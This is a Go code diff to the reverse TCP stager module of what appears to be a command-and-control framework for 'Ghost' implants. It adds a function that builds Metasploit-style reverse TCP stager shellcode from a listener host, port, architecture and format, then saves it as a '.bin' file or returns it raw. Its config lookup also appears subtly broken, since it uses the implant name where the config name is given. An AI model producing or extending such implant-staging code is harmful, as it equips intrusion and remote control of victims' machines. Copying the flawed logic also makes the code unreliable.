@@ -19,6 +19,8 @@ package reverse_tcp
 import (
 	"errors"
 	"fmt"
+	"io/ioutil"
+	"os"
 	"path/filepath"
 	"strconv"
 	"strings"
@@ -76,6 +78,7 @@ func (s *ReverseTCPStager) Run(command string) (result string, err error) {
 
 	switch action {
 	case "run":
+		return s.CompileStager()
 	case "to_listener":
 		return s.toListener()
 	}
@@ -108,7 +111,7 @@ func (s *ReverseTCPStager) toListener() (result string, err error) {
 		ghosts, _ := generate.GhostFiles()
 		for _, g := range ghosts {
 			ghost := strings.TrimPrefix(g, ".")
-			// If ghost if found in names...
+			// If ghost is found in names...
 			if ghost == implant {
 				// Fetch config for checking format
 				config, err = generate.GhostConfigByName(ghost)
@@ -168,4 +171,82 @@ func (s *ReverseTCPStager) toListener() (result string, err error) {
 	core.Jobs.AddJob(job)
 
 	return fmt.Sprintf("Reverse TCP Stager listener started at %s:%d, serving %s as shellcode", host, port, implant), nil
+}
+
+func (s *ReverseTCPStager) CompileStager() (result string, err error) {
+
+	// Check options
+	host := s.Base.Options["LHostStager"].Value
+	if host == "" {
+		return "", errors.New("You must specify a stager LHost")
+	}
+	portUint, err := strconv.Atoi(s.Base.Options["LPortStager"].Value)
+	if err != nil {
+		return "", errors.New("Error parsing stager LPort")
+	}
+	port := uint16(portUint)
+	if port == 0 {
+		return "", errors.New("Invalid stager LPort")
+	}
+	format := s.Base.Options["OutputFormat"].Value
+	if format == "" {
+		return "", errors.New("You must specify a MSF Venom output format")
+	}
+	arch := s.Base.Options["Arch"].Value
+	if arch == "" {
+		return "", errors.New("You must specify a CPU architecture for the Stager")
+	}
+
+	// Create stager shellcode
+	stage, err := generate.GenerateMsfStage(host, port, arch, format, "tcp")
+	if err != nil {
+		errStage := fmt.Sprintf("Failed to generate MSF stager: %s", err.Error())
+		return "", errors.New(errStage)
+	}
+
+	// If needed, save the payload
+	save := s.Base.Options["FileName"].Value
+	if save != "" || format == "raw" {
+		filename := ""
+		if save == "" {
+			// We need a default name, so this code is needed
+			implant := s.Base.Options["StageImplant"].Value
+			configName := s.Base.Options["StageConfig"].Value
+			config := &generate.GhostConfig{}
+			if configName == "" {
+				if implant == "" {
+					return "", errors.New("You must specify a Ghost implant name, either for StageConfig or StageImplant")
+				} else {
+					config, err = generate.GhostConfigByName(implant)
+					if err != nil {
+						return "", errors.New("Defaulted to StageImplant for Stager config, but config does not exist")
+					}
+				}
+			} else {
+				config, err = generate.GhostConfigByName(implant)
+				if err != nil {
+					return "", errors.New("Invalid Ghost implant name for Stager config")
+				}
+			}
+
+			filename = fmt.Sprintf("%s_stager.bin", config.Name)
+		} else {
+			filename = fmt.Sprintf("%s_stager.bin", save)
+		}
+
+		if !strings.HasSuffix(filename, "_stager.bin") {
+			filename = filename + "_stager.bin"
+		}
+		saveTo := fmt.Sprintf(filepath.Join(assets.GetStagersDir(), filename))
+		err = ioutil.WriteFile(saveTo, stage, os.ModePerm)
+		if err != nil {
+			result = fmt.Sprintf("Failed to write stager as %s\n", saveTo)
+			return "", errors.New(result)
+		}
+		result = fmt.Sprintf("Reverse TCP stager saved as %s\n", saveTo)
+		return result, nil
+	}
+
+	// Else, return the raw shellcode
+	return string(stage), nil
 }
